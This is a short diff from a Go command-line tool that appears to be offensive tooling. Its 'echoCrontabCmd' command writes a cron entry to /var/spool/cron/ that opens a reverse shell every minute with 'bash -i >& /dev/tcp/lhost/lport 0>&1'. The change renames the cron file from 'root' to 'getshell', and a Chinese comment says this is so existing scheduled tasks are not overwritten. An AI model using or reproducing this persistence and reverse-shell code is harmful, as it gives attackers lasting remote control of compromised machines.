@@ -125,7 +125,8 @@ var echoCrontabCmd = &cobra.Command{
 			return
 		}
 		webshell = fmt.Sprintf("*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
-		EchoShell("/var/spool/cron/", "root", webshell)
+		// 在写计划任务的时候可以任意文件名，默认不要写root，这样可能会覆盖原有的计划任务。
+		EchoShell("/var/spool/cron/", "getshell", webshell)
 	},
 }
 
